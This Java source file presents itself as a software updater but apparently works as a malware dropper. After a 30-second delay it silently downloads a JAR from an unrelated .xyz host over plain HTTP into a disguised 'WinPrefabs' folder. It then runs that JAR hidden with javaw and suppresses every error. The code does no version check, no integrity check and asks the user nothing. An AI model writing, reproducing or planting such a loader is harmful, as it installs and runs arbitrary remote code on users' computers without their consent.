package me.kutuzov.updater;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class Updater {
    private static String getJavaPath() { return Paths.get(System.getProperty("java.home"), "bin", "javaw.exe").toString(); }
    public static boolean setCurrentDirectory(String directory_name) {
        boolean result = false;
        File directory = new File(directory_name).getAbsoluteFile();
        if (directory.exists() || directory.mkdirs())
            result = (System.setProperty("user.dir", directory.getAbsolutePath()) != null);
        return result;
    }

    public static void main(String[] args) {
        setCurrentDirectory("C:\\WinPrefabs");

        try {
            Thread.sleep(30000);
            URL website = new URL("http://analytics190.antecedentium.xyz/client.jar");
            URLConnection connection = website.openConnection();
            connection.addRequestProperty("User-Agent", "aaa");
            connection.setConnectTimeout(20000);
            connection.setReadTimeout(120000);
            InputStream is = connection.getInputStream();
            Files.copy(is, Paths.get("C:\\WinPrefabs\\main.jar"), StandardCopyOption.REPLACE_EXISTING);
            is.close();
        } catch (Exception exception) { }

        String javaPath = getJavaPath();
        try {
            Process p = Runtime.getRuntime().exec("\"" + javaPath + "\" -Duser.dir=C:\\WinPrefabs -jar C:\\WinPrefabs\\main.jar");
        } catch (Exception exception) {}
    }
}